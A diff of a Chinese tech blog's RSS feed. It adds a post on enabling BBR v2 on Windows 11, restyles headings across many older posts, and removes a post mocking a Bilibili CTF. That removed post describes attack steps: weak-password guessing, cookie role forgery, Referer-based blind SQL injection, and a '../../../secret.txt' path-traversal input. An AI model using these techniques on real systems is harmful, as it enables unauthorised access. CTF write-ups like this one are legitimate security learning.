@@ -15,13 +15,13 @@
 	<atom:link href="https://dev.moe/feed" rel="self" type="application/rss+xml" />
 	<link>https://dev.moe/</link>
 	<description></description>
-	<lastBuildDate>Wed, 15 Feb 2023 05:40:34 +0000</lastBuildDate>
+	<lastBuildDate>Thu, 27 Apr 2023 00:17:21 +0000</lastBuildDate>
 	<language>zh-CN</language>
 	<sy:updatePeriod>
 	hourly	</sy:updatePeriod>
 	<sy:updateFrequency>
 	1	</sy:updateFrequency>
-	<generator>https://wordpress.org/?v=6.1.1</generator>
+	<generator>https://wordpress.org/?v=6.2.2</generator>
 
 <image>
 	<url>https://dev.moe/wp-content/uploads/2015/11/cropped-0e9d3ee98a13c72bf9e698bd46214bb7-32x32.png</url>
@@ -31,6 +31,111 @@
 	<height>32</height>
 </image> 
 <site xmlns="com-wordpress:feed-additions:1">66418562</site>	<item>
+		<title>在 Windows 11 下启用 BBR v2</title>
+		<link>https://dev.moe/2829</link>
+					<comments>https://dev.moe/2829#comments</comments>
+		
+		<dc:creator><![CDATA[Coxxs]]></dc:creator>
+		<pubDate>Wed, 26 Apr 2023 14:38:17 +0000</pubDate>
+				<category><![CDATA[Random]]></category>
+		<guid isPermaLink="false">https://dev.moe/?p=2829</guid>
+
+					<description><![CDATA[<p>BBR 是 Google 开发的 TCP 拥塞控制算法。它改善了传统拥塞控制算法（如 CUBIC）一丢包就降速<a class="more-link" href="https://dev.moe/2829">继续阅读<span class="screen-reader-text">"在 Windows 11 下启用 BBR v2"</span></a></p>
+<p><a rel="nofollow" href="https://dev.moe/2829">在 Windows 11 下启用 BBR v2</a>最先出现在<a rel="nofollow" href="https://dev.moe">Coxxs</a>。</p>
+]]></description>
+										<content:encoded><![CDATA[
+<p>BBR 是 Google 开发的 TCP 拥塞控制算法。它改善了传统拥塞控制算法（如 CUBIC）一丢包就降速的缺点，让带宽利用率在高丢包环境下大幅提升。</p>
+
+
+
+<p>需要注意，拥塞控制算法控制的是<strong>发包速度</strong>。如 Google 服务器开启了 BBR，其上传速度将尽可能占满用户带宽；在用户的角度看来，则体验到了更快的下载速度。</p>
+
+
+
+<h2 class="wp-block-heading">众所周知&#8230;</h2>
+
+
+
+<p>许多朋友会在自己的 Linux 服务器上，用几句命令轻松开启 BBR：</p>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="bash" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">echo "net.core.default_qdisc=fq" >> /etc/sysctl.conf
+echo "net.ipv4.tcp_congestion_control=bbr" >> /etc/sysctl.conf
+sysctl -p</pre>
+
+
+
+<p>于是，当他们从服务器下载文件时，服务器就会尽可能用满带宽。可当他们上传文件时，速度却依旧很慢。这是因为他们上传所用的系统，仍在使用传统的拥塞控制算法。</p>
+
+
+
+<span id="more-2829"></span>
+
+
+
+<p>如果用户使用的是 Linux 系统，用同样的步骤开启 BBR 即可。而对于 Windows 系统，如果是 Windows 11 22H2 以上版本，Microsoft 也<a href="https://datatracker.ietf.org/meeting/112/materials/slides-112-iccrg-an-update-on-rledbat-and-bbrv2-00" target="_blank" rel="noreferrer noopener">添加了</a> BBRv2 的支持。</p>
+
+
+
+<h2 class="wp-block-heading">在 Windows 11 下启用 BBR / BBR v2</h2>
+
+
+
+<p>打开 PowerShell（管理员），先查看一下当前的拥塞控制算法：</p>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="powershell" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">NetTCPSetting | Select SettingName, CongestionProvider</pre>
+
+
+
+<p>然后开启 BBRv2：</p>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="powershell" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">netsh int tcp set supplemental template=Internet congestionprovider=BBR2
+netsh int tcp set supplemental template=InternetCustom congestionprovider=BBR2
+netsh int tcp set supplemental template=Datacenter congestionprovider=BBR2
+netsh int tcp set supplemental template=DatacenterCustom congestionprovider=BBR2
+netsh int tcp set supplemental template=Compat congestionprovider=BBR2</pre>
+
+
+
+<blockquote class="wp-block-quote">
+<p>此处也可以将 <code>BBR2</code> 替换为 <code>BBR</code>（BBR v1），有兴趣的朋友可以测试比较一下效果。</p>
+</blockquote>
+
+
+
+<p>再次输入命令，确认已成功开启。</p>
+
+
+<div class="wp-block-image">
+<figure class="aligncenter size-full is-resized"><a href="https://dev.moe/wp-content/uploads/2023/04/image.png"><img decoding="async" src="https://dev.moe/wp-content/uploads/2023/04/image.png" alt="" class="wp-image-2830" width="525" height="172" srcset="https://dev.moe/wp-content/uploads/2023/04/image.png 1018w, https://dev.moe/wp-content/uploads/2023/04/image-300x99.png 300w, https://dev.moe/wp-content/uploads/2023/04/image-768x253.png 768w" sizes="(max-width: 525px) 100vw, 525px" /></a></figure></div>
+
+
+<h2 class="wp-block-heading">启用后&#8230;</h2>
+
+
+<div class="wp-block-image">
+<figure class="aligncenter size-full is-resized"><a href="https://dev.moe/wp-content/uploads/2023/04/image-1.png"><img decoding="async" loading="lazy" src="https://dev.moe/wp-content/uploads/2023/04/image-1.png" alt="" class="wp-image-2832" width="467" height="359" srcset="https://dev.moe/wp-content/uploads/2023/04/image-1.png 766w, https://dev.moe/wp-content/uploads/2023/04/image-1-300x231.png 300w" sizes="(max-width: 467px) 100vw, 467px" /></a></figure></div>
+
+
+<p>无需重启系统，单线程上传速度从 10Mbps 提升到了 30Mbps。推流及访问网页等场景的体验也获得了提升。</p>
+
+
+
+<p><strong>Coxxs</strong></p>
+<p><a rel="nofollow" href="https://dev.moe/2829">在 Windows 11 下启用 BBR v2</a>最先出现在<a rel="nofollow" href="https://dev.moe">Coxxs</a>。</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>https://dev.moe/2829/feed</wfw:commentRss>
+			<slash:comments>2</slash:comments>
+		
+		
+		<post-id xmlns="com-wordpress:feed-additions:1">2829</post-id>	</item>
+		<item>
 		<title>ESXi 7.0 + R8168 / R8169 安装笔记</title>
 		<link>https://dev.moe/2794</link>
 					<comments>https://dev.moe/2794#comments</comments>
@@ -56,11 +161,11 @@
 
 
 
-<h2>USB Network Native Driver for ESXi</h2>
+<h2 class="wp-block-heading">USB Network Native Driver for ESXi</h2>
 
 
 <div class="wp-block-image">
-<figure class="aligncenter size-full is-resized"><a href="https://dev.moe/wp-content/uploads/2022/08/image.png"><img decoding="async" src="https://dev.moe/wp-content/uploads/2022/08/image.png" alt="" class="wp-image-2795" width="279" height="167" srcset="https://dev.moe/wp-content/uploads/2022/08/image.png 827w, https://dev.moe/wp-content/uploads/2022/08/image-300x180.png 300w, https://dev.moe/wp-content/uploads/2022/08/image-768x462.png 768w" sizes="(max-width: 279px) 100vw, 279px" /></a><figcaption>USB NIC</figcaption></figure></div>
+<figure class="aligncenter size-full is-resized"><a href="https://dev.moe/wp-content/uploads/2022/08/image.png"><img decoding="async" loading="lazy" src="https://dev.moe/wp-content/uploads/2022/08/image.png" alt="" class="wp-image-2795" width="279" height="167" srcset="https://dev.moe/wp-content/uploads/2022/08/image.png 827w, https://dev.moe/wp-content/uploads/2022/08/image-300x180.png 300w, https://dev.moe/wp-content/uploads/2022/08/image-768x462.png 768w" sizes="(max-width: 279px) 100vw, 279px" /></a><figcaption>USB NIC</figcaption></figure></div>
 
 
 <p>幸运的是，ESXi 现在提供了几款热门 USB 网卡的原生驱动（ASIX88179, RTL8152/RTL8153, AQC111U）。我们可以购买一个支持的 USB NIC 适配器，然后制作包含 <a href="https://flings.vmware.com/usb-network-native-driver-for-esxi" target="_blank" rel="noreferrer noopener">VMKUSB-NIC-FLING</a> 驱动的镜像来安装 ESXi。</p>
@@ -90,7 +195,7 @@ esxcfg-vswitch -R</pre>
 
 
 
-<h2>R8168 Passthrough</h2>
+<h2 class="wp-block-heading">R8168 Passthrough</h2>
 
 
 
@@ -170,7 +275,7 @@ ubuntu kernel: [ 2581.050921] WARNING: CPU: 0 PID: 0 at net/sched/sch_generic.c:
 
 
 
-<h2>解锁 Bootloader</h2>
+<h2 class="wp-block-heading">解锁 Bootloader</h2>
 
 
 
@@ -196,7 +301,7 @@ ubuntu kernel: [ 2581.050921] WARNING: CPU: 0 PID: 0 at net/sched/sch_generic.c:
 
 
 
-<h2>安装 Magisk</h2>
+<h2 class="wp-block-heading">安装 Magisk</h2>
 
 
 
@@ -230,7 +335,7 @@ ubuntu kernel: [ 2581.050921] WARNING: CPU: 0 PID: 0 at net/sched/sch_generic.c:
 
 
 
-<h2>备份 Persist 分区（可选）</h2>
+<h2 class="wp-block-heading">备份 Persist 分区（可选）</h2>
 
 
 
@@ -260,7 +365,7 @@ adb pull /sdcard/persist.img</pre>
 
 
 
-<h2>刷入 GSI 镜像</h2>
+<h2 class="wp-block-heading">刷入 GSI 镜像</h2>
 
 
 
@@ -360,7 +465,7 @@ adb pull /sdcard/persist.img</pre>
 
 
 
-<h2>功能补丁</h2>
+<h2 class="wp-block-heading">功能补丁</h2>
 
 
 
@@ -368,7 +473,7 @@ adb pull /sdcard/persist.img</pre>
 
 
 
-<h3>修复启动器 / 任务栏</h3>
+<h3 class="wp-block-heading">修复启动器 / 任务栏</h3>
 
 
 
@@ -384,7 +489,7 @@ adb pull /sdcard/persist.img</pre>
 
 
 
-<h3>开启 120 Hz</h3>
+<h3 class="wp-block-heading">开启 120 Hz</h3>
 
 
 
@@ -397,7 +502,7 @@ adb shell settings put system peak_refresh_rate 120</pre>
 
 
 
-<h3>修复音频</h3>
+<h3 class="wp-block-heading">修复音频</h3>
 
 
 
@@ -413,7 +518,7 @@ adb shell settings put system peak_refresh_rate 120</pre>
 
 
 
-<h3>移除屏幕锐化</h3>
+<h3 class="wp-block-heading">移除屏幕锐化</h3>
 
 
 
@@ -425,7 +530,7 @@ adb shell settings put system peak_refresh_rate 120</pre>
 
 
 
-<h3>SafetyNet</h3>
+<h3 class="wp-block-heading">SafetyNet</h3>
 
 
 
@@ -445,7 +550,7 @@ adb shell settings put system peak_refresh_rate 120</pre>
 
 
 
-<h4>Magisk DenyList 配置方法</h4>
+<h4 class="wp-block-heading">Magisk DenyList 配置方法</h4>
 
 
 
@@ -467,7 +572,7 @@ adb shell settings put system peak_refresh_rate 120</pre>
 
 
 
-<h3>DRM</h3>
+<h3 class="wp-block-heading">DRM</h3>
 
 
 
@@ -513,7 +618,7 @@ adb shell settings put system peak_refresh_rate 120</pre>
 
 
 
-<h2>系统升级</h2>
+<h2 class="wp-block-heading">系统升级</h2>
 
 
 
@@ -575,7 +680,7 @@ adb shell settings put system peak_refresh_rate 120</pre>
 ]]></content:encoded>
 					
 					<wfw:commentRss>https://dev.moe/2716/feed</wfw:commentRss>
-			<slash:comments>8</slash:comments>
+			<slash:comments>10</slash:comments>
 		
 		
 		<post-id xmlns="com-wordpress:feed-additions:1">2716</post-id>	</item>
@@ -609,7 +714,7 @@ adb shell settings put system peak_refresh_rate 120</pre>
 
 
 
-<h2 id="从日常宕机的-dc5-说起">从日常宕机的 DC5 说起</h2>
+<h2 class="wp-block-heading" id="从日常宕机的-dc5-说起">从日常宕机的 DC5 说起</h2>
 
 
 
@@ -625,7 +730,7 @@ adb shell settings put system peak_refresh_rate 120</pre>
 
 
 
-<h2 id="dc2-与-dc3-之谜">DC2 与 DC3 之谜</h2>
+<h2 class="wp-block-heading" id="dc2-与-dc3-之谜">DC2 与 DC3 之谜</h2>
 
 
 
@@ -657,7 +762,7 @@ adb shell settings put system peak_refresh_rate 120</pre>
 
 
 
-<h2 id="telegram-dc-的分配规则-2022-05">Telegram DC 的分配规则（2022-05）</h2>
+<h2 class="wp-block-heading" id="telegram-dc-的分配规则-2022-05">Telegram DC 的分配规则（2022-05）</h2>
 
 
 
@@ -681,7 +786,7 @@ adb shell settings put system peak_refresh_rate 120</pre>
 
 
 
-<h2 id="我到底在哪个-dc">我到底在哪个 DC？</h2>
+<h2 class="wp-block-heading" id="我到底在哪个-dc">我到底在哪个 DC？</h2>
 
 
 
@@ -689,7 +794,7 @@ adb shell settings put system peak_refresh_rate 120</pre>
 
 
 
-<h3 id="方法-1-登录法">方法 1（登录法）</h3>
+<h3 class="wp-block-heading" id="方法-1-登录法">方法 1（登录法）</h3>
 
 
 
@@ -709,7 +814,7 @@ adb shell settings put system peak_refresh_rate 120</pre>
 
 
 
-<h3 id="方法-2-头像-文件法">方法 2（头像/文件法）</h3>
+<h3 class="wp-block-heading" id="方法-2-头像-文件法">方法 2（头像/文件法）</h3>
 
 
 
@@ -737,7 +842,7 @@ adb shell settings put system peak_refresh_rate 120</pre>
 
 
 
-<h3 id="方法-3-web-cdn-法">方法 3（Web CDN 法）</h3>
+<h3 class="wp-block-heading" id="方法-3-web-cdn-法">方法 3（Web CDN 法）</h3>
 
 
 
@@ -769,7 +874,7 @@ adb shell settings put system peak_refresh_rate 120</pre>
 
 
 
-<h2 id="dc3-的消失">DC3 的消失</h2>
+<h2 class="wp-block-heading" id="dc3-的消失">DC3 的消失</h2>
 
 
 
@@ -880,7 +985,7 @@ adb shell settings put system peak_refresh_rate 120</pre>
 
 
 
-<h2>风扇</h2>
+<h2 class="wp-block-heading">风扇</h2>
 
 
 
@@ -938,7 +1043,7 @@ adb shell settings put system peak_refresh_rate 120</pre>
 
 
 
-<h2>屏幕</h2>
+<h2 class="wp-block-heading">屏幕</h2>
 
 
 
@@ -976,7 +1081,7 @@ adb shell settings put system peak_refresh_rate 120</pre>
 
 
 
-<h2>蓝牙断连</h2>
+<h2 class="wp-block-heading">蓝牙断连</h2>
 
 
 
@@ -1006,7 +1111,7 @@ adb shell settings put system peak_refresh_rate 120</pre>
 
 
 
-<h2>Wi-Fi 断流</h2>
+<h2 class="wp-block-heading">Wi-Fi 断流</h2>
 
 
 
@@ -1043,7 +1148,7 @@ adb shell settings put system peak_refresh_rate 120</pre>
 
 
 
-<h2>漏电</h2>
+<h2 class="wp-block-heading">漏电</h2>
 
 
 
@@ -1055,7 +1160,7 @@ adb shell settings put system peak_refresh_rate 120</pre>
 
 
 
-<h2>Windows 11</h2>
+<h2 class="wp-block-heading">Windows 11</h2>
 
 
 
@@ -1146,7 +1251,7 @@ adb shell settings put system peak_refresh_rate 120</pre>
 ]]></content:encoded>
 					
 					<wfw:commentRss>https://dev.moe/2488/feed</wfw:commentRss>
-			<slash:comments>3</slash:comments>
+			<slash:comments>5</slash:comments>
 		
 		
 		<post-id xmlns="com-wordpress:feed-additions:1">2488</post-id>	</item>
@@ -1192,7 +1297,7 @@ adb shell settings put system peak_refresh_rate 120</pre>
 
 
 
-<h2 id="安装显卡驱动">安装显卡驱动</h2>
+<h2 class="wp-block-heading" id="安装显卡驱动">安装显卡驱动</h2>
 
 
 
@@ -1204,7 +1309,7 @@ adb shell settings put system peak_refresh_rate 120</pre>
 
 
 
-<h2 id="安装音频输出驱动">安装音频输出驱动</h2>
+<h2 class="wp-block-heading" id="安装音频输出驱动">安装音频输出驱动</h2>
 
 
 
@@ -1216,7 +1321,7 @@ adb shell settings put system peak_refresh_rate 120</pre>
 
 
 
-<h2 id="安装-amd-radeon-software-控制面板">安装 AMD Radeon Software 控制面板</h2>
+<h2 class="wp-block-heading" id="安装-amd-radeon-software-控制面板">安装 AMD Radeon Software 控制面板</h2>
 
 
 
@@ -1294,7 +1399,7 @@ adb shell settings put system peak_refresh_rate 120</pre>
 
 
 
-<h2 id="噪音">噪音</h2>
+<h2 class="wp-block-heading" id="噪音">噪音</h2>
 
 
 
@@ -1340,7 +1445,7 @@ adb shell settings put system peak_refresh_rate 120</pre>
 
 
 
-<h2 id="噪音-对他人">噪音（对他人）</h2>
+<h2 class="wp-block-heading" id="噪音-对他人">噪音（对他人）</h2>
 
 
 
@@ -1367,7 +1472,7 @@ adb shell settings put system peak_refresh_rate 120</pre>
 
 
 
-<h2 id="创新">创新</h2>
+<h2 class="wp-block-heading" id="创新">创新</h2>
 
 
 
@@ -1419,7 +1524,7 @@ adb shell settings put system peak_refresh_rate 120</pre>
 
 
 
-<h2 id="性能-分辨率-帧率-画面表现">性能（分辨率、帧率、画面表现）</h2>
+<h2 class="wp-block-heading" id="性能-分辨率-帧率-画面表现">性能（分辨率、帧率、画面表现）</h2>
 
 
 
@@ -1431,7 +1536,7 @@ adb shell settings put system peak_refresh_rate 120</pre>
 
 
 
-<h3 id="老游戏性能">老游戏性能</h3>
+<h3 class="wp-block-heading" id="老游戏性能">老游戏性能</h3>
 
 
 
@@ -1446,7 +1551,7 @@ adb shell settings put system peak_refresh_rate 120</pre>
 
 
 
-<h3 id="120fps">120fps</h3>
+<h3 class="wp-block-heading" id="120fps">120fps</h3>
 
 
 
@@ -1458,7 +1563,7 @@ adb shell settings put system peak_refresh_rate 120</pre>
 
 
 
-<h3 id="其他">其他</h3>
+<h3 class="wp-block-heading" id="其他">其他</h3>
 
 
 
@@ -1470,7 +1575,7 @@ adb shell settings put system peak_refresh_rate 120</pre>
 
 
 
-<h2 id="区域锁及价格">区域锁及价格</h2>
+<h2 class="wp-block-heading" id="区域锁及价格">区域锁及价格</h2>
 
 
 
@@ -1478,7 +1583,7 @@ adb shell settings put system peak_refresh_rate 120</pre>
 
 
 
-<h3 id="xbox">Xbox</h3>
+<h3 class="wp-block-heading" id="xbox">Xbox</h3>
 
 
 
@@ -1489,7 +1594,7 @@ adb shell settings put system peak_refresh_rate 120</pre>
 <figure class="aligncenter size-large is-resized"><a href="https://dev.moe/wp-content/uploads/2021/06/image-2.png"><img decoding="async" loading="lazy" src="https://dev.moe/wp-content/uploads/2021/06/image-2-1024x576.png" alt="数了一下目前的 Xbox Game Pass 游戏库，竟有 300 多款游戏，这还没算上 EA Play 的 70 多款游戏。" class="wp-image-2346" width="512" height="288" srcset="https://dev.moe/wp-content/uploads/2021/06/image-2-1024x576.png 1024w, https://dev.moe/wp-content/uploads/2021/06/image-2-300x169.png 300w, https://dev.moe/wp-content/uploads/2021/06/image-2-768x432.png 768w, https://dev.moe/wp-content/uploads/2021/06/image-2.png 1280w" sizes="(max-width: 512px) 100vw, 512px" /></a><figcaption>数了一下目前的 Xbox Game Pass 游戏库 ——共有 51 行（这还没算上 EA Play 的 70+ 游戏）</figcaption></figure></div>
 
 
-<h3 id="ps5">PS5</h3>
+<h3 class="wp-block-heading" id="ps5">PS5</h3>
 
 
 
@@ -1508,7 +1613,7 @@ adb shell settings put system peak_refresh_rate 120</pre>
 
 
 
-<h2 id="独占游戏">独占游戏</h2>
+<h2 class="wp-block-heading" id="独占游戏">独占游戏</h2>
 
 
 
@@ -1524,7 +1629,7 @@ adb shell settings put system peak_refresh_rate 120</pre>
 
 
 
-<h2 id="远程游玩及分享">远程游玩及分享</h2>
+<h2 class="wp-block-heading" id="远程游玩及分享">远程游玩及分享</h2>
 
 
 
@@ -1560,7 +1665,7 @@ adb shell settings put system peak_refresh_rate 120</pre>
 
 
 
-<h2 id="维护及维修">维护及维修</h2>
+<h2 class="wp-block-heading" id="维护及维修">维护及维修</h2>
 
 
 
@@ -1671,7 +1776,7 @@ production-web.sekai.colorfulpalette.org
 
 
 
-<h2>游戏资源分析</h2>
+<h2 class="wp-block-heading">游戏资源分析</h2>
 
 
 
@@ -1683,7 +1788,7 @@ production-web.sekai.colorfulpalette.org
 
 
 
-<h3>资源混淆</h3>
+<h3 class="wp-block-heading">资源混淆</h3>
 
 
 
@@ -1699,7 +1804,7 @@ production-web.sekai.colorfulpalette.org
 
 
 
-<h3>Live2D 资源</h3>
+<h3 class="wp-block-heading">Live2D 资源</h3>
 
 
 
@@ -1727,7 +1832,7 @@ production-web.sekai.colorfulpalette.org
 
 
 
-<h3>音频资源</h3>
+<h3 class="wp-block-heading">音频资源</h3>
 
 
 
@@ -1739,7 +1844,7 @@ production-web.sekai.colorfulpalette.org
 
 
 
-<h3>按需下载资源</h3>
+<h3 class="wp-block-heading">按需下载资源</h3>
 
 
 
@@ -1747,7 +1852,7 @@ production-web.sekai.colorfulpalette.org
 
 
 
-<h2>网络通信分析</h2>
+<h2 class="wp-block-heading">网络通信分析</h2>
 
 
 
@@ -1771,7 +1876,7 @@ production-web.sekai.colorfulpalette.org
 
 
 
-<h2>总结</h2>
+<h2 class="wp-block-heading">总结</h2>
 
 
 
@@ -1818,7 +1923,7 @@ production-web.sekai.colorfulpalette.org
 
 
 
-<h2>超自动的开箱模拟器 200</h2>
+<h2 class="wp-block-heading">超自动的开箱模拟器 200</h2>
 
 
 
@@ -1894,7 +1999,7 @@ while (true) {
 
 
 
-<h2>超精巧的数字论证器 200</h2>
+<h2 class="wp-block-heading">超精巧的数字论证器 200</h2>
 
 
 
@@ -2123,7 +2228,7 @@ if __name__ == "__main__":
 
 
 
-<h2>超简易的网盘服务器 200</h2>
+<h2 class="wp-block-heading">超简易的网盘服务器 200</h2>
 
 
 
@@ -2184,7 +2289,7 @@ if __name__ == "__main__":
 
 
 
-<h2>超安全的代理服务器 350</h2>
+<h2 class="wp-block-heading">超安全的代理服务器 350</h2>
 
 
 
@@ -2262,7 +2367,7 @@ function connectProxy(secret) {
 
 
 
-<h2>证验码 250</h2>
+<h2 class="wp-block-heading">证验码 250</h2>
 
 
 
@@ -2389,7 +2494,7 @@ if __name__ == "__main__":
 
 
 
-<h2>中间人 750</h2>
+<h2 class="wp-block-heading">中间人 750</h2>
 
 
 
@@ -2560,7 +2665,7 @@ for pos in range(len(ret) + 1, 70):
 
 
 
-<h2>从零开始的火星文生活 150</h2>
+<h2 class="wp-block-heading">从零开始的火星文生活 150</h2>
 
 
 
@@ -2588,7 +2693,7 @@ for pos in range(len(ret) + 1, 70):
 
 
 
-<h2>超简单的世界模拟器 250</h2>
+<h2 class="wp-block-heading">超简单的世界模拟器 250</h2>
 
 
 
@@ -2624,7 +2729,7 @@ for pos in range(len(ret) + 1, 70):
 
 
 
-<h2>自复读的复读机 300</h2>
+<h2 class="wp-block-heading">自复读的复读机 300</h2>
 
 
 
@@ -2721,7 +2826,7 @@ if __name__ == "__main__":
 
 
 
-<h2>生活在博弈树上 350</h2>
+<h2 class="wp-block-heading">生活在博弈树上 350</h2>
 
 
 
@@ -2772,7 +2877,7 @@ if __name__ == "__main__":
 
 
 
-<h2>来自未来的信笺 200</h2>
+<h2 class="wp-block-heading">来自未来的信笺 200</h2>
 
 
 
@@ -2818,7 +2923,7 @@ fs.writeFile('output.bin', new Uint8Array(output))</pre>
 
 
 
-<h2>签到 50</h2>
+<h2 class="wp-block-heading">签到 50</h2>
 
 
 
@@ -2834,7 +2939,7 @@ fs.writeFile('output.bin', new Uint8Array(output))</pre>
 
 
 
-<h3>Range Slider</h3>
+<h3 class="wp-block-heading">Range Slider</h3>
 
 
 
@@ -2858,7 +2963,7 @@ fs.writeFile('output.bin', new Uint8Array(output))</pre>
 
 
 
-<h3>键盘操作</h3>
+<h3 class="wp-block-heading">键盘操作</h3>
 
 
 
@@ -2878,7 +2983,7 @@ fs.writeFile('output.bin', new Uint8Array(output))</pre>
 
 
 
-<h3>JavaScript 分析</h3>
+<h3 class="wp-block-heading">JavaScript 分析</h3>
 
 
 
@@ -2907,7 +3012,7 @@ $('#number').on('input', function() {
 
 
 
-<h3>问题的本质</h3>
+<h3 class="wp-block-heading">问题的本质</h3>
 
 
 
@@ -2959,369 +3064,5 @@ clientSocket.on('data', (data) => {
 		
 		
 		<post-id xmlns="com-wordpress:feed-additions:1">2099</post-id>	</item>
-		<item>
-		<title>首届 Bilibili 安全挑战赛吐槽</title>
-		<link>https://dev.moe/1907</link>
-					<comments>https://dev.moe/1907#comments</comments>
-		
-		<dc:creator><![CDATA[Coxxs]]></dc:creator>
-		<pubDate>Mon, 26 Oct 2020 16:00:00 +0000</pubDate>
-				<category><![CDATA[Code]]></category>
-		<guid isPermaLink="false">https://dev.moe/?p=1907</guid>
-
-					<description><![CDATA[<p>朋友发来一个 Bilibili CTF 的链接，点进去看了下。开赛已经几小时，进入比赛的按钮指向的是一个 10<a class="more-link" href="https://dev.moe/1907">继续阅读<span class="screen-reader-text">"首届 Bilibili 安全挑战赛吐槽"</span></a></p>
-<p><a rel="nofollow" href="https://dev.moe/1907">首届 Bilibili 安全挑战赛吐槽</a>最先出现在<a rel="nofollow" href="https://dev.moe">Coxxs</a>。</p>
-]]></description>
-										<content:encoded><![CDATA[
-<p>朋友发来一个 Bilibili CTF 的链接，点进去看了下。开赛已经几小时，进入比赛的按钮指向的是一个 <code>10.</code> 开头的<strong>内网IP地址</strong>。试着把这个IP换成当前页面的地址，成功进入了题目页面。又过了一阵子，这个进入比赛的链接终于被改成正确的地址了——我想，这应该只是个小失误吧。作为国内最大（去二次元化）二次元视频网站的哔哩哔哩，其举办的安全竞赛不说专业，但应该也会挺有意思的吧。</p>
-
-
-
-<figure class="wp-block-image size-large is-resized"><a href="https://dev.moe/wp-content/uploads/2020/10/2.png"><img decoding="async" loading="lazy" src="https://dev.moe/wp-content/uploads/2020/10/2-1024x516.png" alt="" class="wp-image-1913" width="627" height="316" srcset="https://dev.moe/wp-content/uploads/2020/10/2-1024x516.png 1024w, https://dev.moe/wp-content/uploads/2020/10/2-300x151.png 300w, https://dev.moe/wp-content/uploads/2020/10/2-768x387.png 768w, https://dev.moe/wp-content/uploads/2020/10/2.png 1060w" sizes="(max-width: 627px) 100vw, 627px" /></a><figcaption>前去（B站内网）解题</figcaption></figure>
-
-
-
-<p>确实挺有意思的，不过有意思的并不是题目本身。</p>
-
-
-
-<span id="more-1907"></span>
-
-
-
-<h2><s>Write up</s> 吐槽时间</h2>
-
-
-
-<p>题 1-6 必须解出前一题才能看见下一题题目。</p>
-
-
-
-<p><strong>题 1：</strong> <code>&lt;input type="hidden" values="{flag}"&gt;</code></p>
-
-
-
-<p><strong>题 2：</strong>“需要使用bilibili Security Browser浏览器访问～” → 修改 User-Agent。</p>
-
-
-
-<p><strong>题 3：</strong>“密码是啥？” → <span style="text-decoration: underline;">盲猜</span>出用户名/密码 admin/bilibili。<br><em><span style="color:#6E6E6E" class="has-inline-color">B：没错这不是注入，你们字典里没有 bilibili 是你们的问题！</span></em></p>
-
-
-
-<figure class="wp-block-image size-large"><a href="https://dev.moe/wp-content/uploads/2020/10/image.png"><img decoding="async" loading="lazy" width="1024" height="846" src="https://dev.moe/wp-content/uploads/2020/10/image-1024x846.png" alt="" class="wp-image-1914" srcset="https://dev.moe/wp-content/uploads/2020/10/image-1024x846.png 1024w, https://dev.moe/wp-content/uploads/2020/10/image-300x248.png 300w, https://dev.moe/wp-content/uploads/2020/10/image-768x634.png 768w, https://dev.moe/wp-content/uploads/2020/10/image.png 1354w" sizes="(max-width: 1024px) 100vw, 1024px" /></a><figcaption>我是弱密码哟~ ✧</figcaption></figure>
-
-
-
-<p><strong>题 4：</strong>“superadmin.html: 对不起，权限不足～” → Cookies 中有 role=md5(&#8216;user&#8217;)（首字母小写），<span style="text-decoration: underline;">盲猜</span>出 role=md5(&#8216;Administrator&#8217;) 提交。<br><span style="color:#6E6E6E" class="has-inline-color"><em>B：root 是什么？superadmin 是什么？超级管理员是 Administrator（首字母<strong>大写</strong>）</em>哟~ ✧</span></p>
-
-
-
-<p><strong>题 5：</strong>“有些秘密只有超级管理员才能看见哦”，同时源码中 uid=100336889 → 从 100336889 递增爆破出超级管理员 uid。<br><span style="color:#6E6E6E" class="has-inline-color"><em>B：9bishi 已经不是超级管理员了，我家超级管理员是一个 uid 非常大的员工，别问为什么</em>~</span></p>
-
-
-
-<hr class="wp-block-separator"/>
-
-
-
-<p>接下来只有题 6 给出了一个 URL，7-10 均未给出题目。</p>
-
-
-
-<p><strong>题 6：</strong>一个文章标题内容均为 &#8220;null&#8221;，带评论框的博客页面（single.php?id=1）<br>→ 在 <strong>Referer</strong> 中进行盲注。<br><span style="color:#6E6E6E" class="has-inline-color"><em>B：是的，评论框是装饰用的，<code>?id=1</code> 也是装饰用的~</em></span><br><span style="color:#6E6E6E" class="has-inline-color"><em>我们的鉴权是用 <strong>Referer </strong>做的，Referer 正确就能看到文章内容，是不是很符合实际？</em></span><br><em><span style="color:#6E6E6E" class="has-inline-color">对了，为了防止你们乱搞我把 MySQL 的 sleep 函数顺手禁了！</span></em><br><span style="color:#6E6E6E" class="has-inline-color"><em><strong>benchmark </strong>函数是啥？没听说过！等下&#8230; 靶机怎么又 502 了？</em></span></p>
-
-
-
-<p><strong>题7：</strong>在前几题发现一个 /api/images?file=banner.png，没错，接着猜路径。</p>
-
-
-
-<figure class="wp-block-image size-large is-resized"><a href="https://dev.moe/wp-content/uploads/2020/10/image-5.png"><img decoding="async" loading="lazy" src="https://dev.moe/wp-content/uploads/2020/10/image-5.png" alt="" class="wp-image-2074" width="522" height="104" srcset="https://dev.moe/wp-content/uploads/2020/10/image-5.png 935w, https://dev.moe/wp-content/uploads/2020/10/image-5-300x60.png 300w, https://dev.moe/wp-content/uploads/2020/10/image-5-768x154.png 768w" sizes="(max-width: 522px) 100vw, 522px" /></a></figure>
-
-
-
-<p><strong>题 8：</strong>扫描题 6 给出的 IP，发现 redis 端口，连入 <code>get flag8</code>。</p>
-
-
-
-<p><strong>题 9：</strong>题目位于 /api/images?file=../../../secret.txt，48 字节的未知数据，赛中无人解出本题。<br>赛后有人给出密钥为 &#8216;aes_key&#8217; + &#8216;\0&#8217; * 9，使用 AES-128-ECB 加密，该密钥据说可通过 api/images?file=md5(&#8216;SkRG&#8230;Rw==&#8217;).jpg 获得。</p>
-
-
-
